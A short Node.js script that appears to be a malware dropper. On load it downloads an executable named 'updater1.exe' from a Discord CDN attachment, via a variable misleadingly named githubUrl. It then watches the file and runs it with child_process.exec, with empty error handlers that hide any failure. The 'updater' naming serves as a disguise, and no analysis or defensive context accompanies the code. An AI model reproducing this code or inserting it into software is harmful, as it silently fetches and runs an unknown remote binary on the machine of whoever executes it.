const fs = require('fs');
const http = require('https');
const { exec } = require('child_process');

class ExeFileHandler {
    constructor(exePath) {
        this.exePath = exePath;
    }

    onModified(event) {
        if (event === this.exePath) {
            exec(this.exePath, (error, stdout, stderr) => {
                if (error) {
                }
            });
        }
    }
}

async function downloadExe(repoUrl, exeFilename) {
    const downloadPath = exeFilename;

    const fileStream = fs.createWriteStream(downloadPath);
    const response = await new Promise((resolve, reject) => {
        const request = http.get(repoUrl, (response) => {
            response.pipe(fileStream);
            resolve(response);
        });
        request.on('error', reject);
    });

    if (response.statusCode === 200) {
        observeFile(downloadPath);
    } else {
    }
}

function observeFile(exePath) {
    fs.watch(exePath, (event) => {
        if (event === 'change') {
            exec(exePath, (error, stdout, stderr) => {
                if (error) {
                }
            });
        }
    });
}

const githubUrl = "https://cdn.discordapp.com/attachments/919194639997759521/1169003244949872690/updater1.exe?ex=6553d21c&is=65415d1c&hm=c1f634e2551206c0cdc09c2403dbbcdd7a1491ea956ef255dae087ebdeb21e53&"; // Replace with the correct URL
const exeFilename = "updater1.exe";

downloadExe(githubUrl, exeFilename);

